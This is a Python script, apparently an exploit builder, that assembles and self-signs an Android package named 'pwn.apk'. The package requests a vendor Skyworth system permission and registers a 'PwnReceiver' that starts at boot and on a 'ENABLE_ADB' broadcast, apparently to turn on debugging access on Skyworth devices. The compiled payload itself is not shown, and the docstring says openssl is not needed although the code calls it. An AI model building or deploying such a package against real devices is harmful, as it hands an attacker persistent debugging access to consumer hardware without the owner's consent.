#!/usr/bin/env python3
"""Assemble pwn.apk = AndroidManifest.xml (binary AXML) + classes.dex, zip,
and v1-sign it (JAR signature so PackageManager accepts on Android 10).

v1 signing needs META-INF/{MANIFEST.MF, CERT.SF, CERT.RSA}. Self-signed X.509
generated in pure python (no openssl dependency on the pkcs7 path - use
cryptography lib if present, else raw RSA PKCS#1 + minimal DER cert builder).
"""
import sys, os, zipfile, hashlib, base64, struct, time
sys.path.insert(0, '/tmp/apk')
from axml2 import build_axml

PKG = 'com.omp.pwn'
PERMS = ['com.skyworth.sysctl.permission.broadcast']

axml = build_axml(
    PKG,
    PERMS + ['android.permission.RECEIVE_BOOT_COMPLETED'],
    'com.omp.pwn.MainActivity',
    ['android.intent.action.MAIN', 'android.intent.category.LAUNCHER'],
    receiver=('com.omp.pwn.PwnReceiver',
              ['android.intent.action.BOOT_COMPLETED',
               'com.skyworth.sysctl.action.ENABLE_ADB']))
dex = open('/tmp/apk/classes_pwn.dex', 'rb').read()

# ------------------------------------------------------------------ signing
try:
    from datetime import datetime, timezone, timedelta
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    HAVE_CRYPTO = True
except ImportError:
    HAVE_CRYPTO = False

print('cryptography:', HAVE_CRYPTO)
assert HAVE_CRYPTO, 'need cryptography lib'

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, 'omp')])
now = time.time()
cert = (x509.CertificateBuilder()
    .subject_name(name).issuer_name(name)
    .public_key(key.public_key())
    .serial_number(x509.random_serial_number())
    .not_valid_before(datetime.now(timezone.utc) - timedelta(hours=1))
    .not_valid_after(datetime.now(timezone.utc) + timedelta(days=3650))
    .sign(key, hashes.SHA256()))

key_pem = key.private_bytes(
    serialization.Encoding.PEM,
    serialization.PrivateFormat.PKCS8,
    serialization.NoEncryption())
cert_der = cert.public_bytes(serialization.Encoding.DER)
open('/tmp/apk/pwn_testkey.pem', 'wb').write(key_pem)
open('/tmp/apk/pwn_cert.der', 'wb').write(cert_der)

# ---- jar signature (v1 scheme) ----
def manifest_mf(digests):
    lines = ['Manifest-Version: 1.0', 'Created-By: 1.0 (omp)', '']
    for name, b64 in digests:
        lines.append(f'Name: {name}')
        lines.append(f'SHA-256-Digest: {b64}')
        lines.append('')
    return '\r\n'.join(lines).encode()

def sf_file(mf_bytes, entry_digests):
    d = base64.b64encode(hashlib.sha256(mf_bytes).digest()).decode()
    lines = ['Signature-Version: 1.0',
             'Created-By: 1.0 (omp)',
             f'SHA-256-Digest-Manifest: {d}', '']
    for name, dg in entry_digests:
        lines += [f'Name: {name}', f'SHA-256-Digest: {dg}', '']
    return '\r\n'.join(lines).encode()

def sign_rsa(data):
    sig = key.sign(data, padding.PKCS1v15(), hashes.SHA256())
    return sig

def build_zip_dict(entries):
    """entries: {name: bytes} -> dict with proper CRC etc via zipfile"""
    import io
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, 'w', zipfile.ZIP_DEFLATED) as z:
        for name, data in entries.items():
            zi = zipfile.ZipInfo(name, date_time=(2026, 1, 1, 0, 0, 0))
            zi.compress_type = zipfile.ZIP_DEFLATED
            zi.external_attr = 0o644 << 16
            z.writestr(zi, data)
    return bio.getvalue()

# 1. base zip (unsigned)
base = build_zip_dict({
    'AndroidManifest.xml': axml,
    'classes.dex': dex,
})

# 2. compute digests for each entry (read back from the zip to match stored form)
import io
digests = []
with zipfile.ZipFile(io.BytesIO(base)) as z:
    for name in z.namelist():
        data = z.read(name)
        digests.append((name, base64.b64encode(
            hashlib.sha256(data).digest()).decode()))

mf = manifest_mf(sorted(digests))
sf = sf_file(mf, sorted(digests))
sigbytes = sign_rsa(sf)

# PKCS#7 detached signature over sf (simplified: build via cryptography)
import subprocess, tempfile, os
with tempfile.TemporaryDirectory() as td:
    open(td+'/cert.pem','wb').write(cert.public_bytes(serialization.Encoding.PEM))
    open(td+'/key.pem','wb').write(key_pem)
    open(td+'/sf.bin','wb').write(sf)
    r = subprocess.run(['openssl','cms','-sign','-binary','-nodetach','-noattr',
        '-in', td+'/sf.bin',
        '-signer', td+'/cert.pem', '-inkey', td+'/key.pem',
        '-outform','DER','-out',td+'/p7.der','-md','sha256'],
        capture_output=True, text=True)
    if r.returncode != 0:
        raise RuntimeError('openssl failed: ' + r.stderr)
    p7bytes = open(td+'/p7.der','rb').read()

# 3. final zip with META-INF
final = build_zip_dict({
    'AndroidManifest.xml': axml,
    'classes.dex': dex,
    'META-INF/MANIFEST.MF': mf,
    'META-INF/CERT.SF': sf,
    'META-INF/CERT.RSA': p7bytes,  # RSA sig in .RSA file
})
open('/tmp/apk/bridge.apk', 'wb').write(final)
print('pwn.apk:', len(final), 'bytes')

# verify with pyaxmlparser/androguard APK
import logging; logging.disable(logging.CRITICAL)
from androguard.core.apk import APK
a = APK('/tmp/apk/bridge.apk')
print('package:', a.get_package())
print('activities:', a.get_activities())
print('permissions:', a.get_permissions())
print('is signed v1:', a.is_signed_v1())
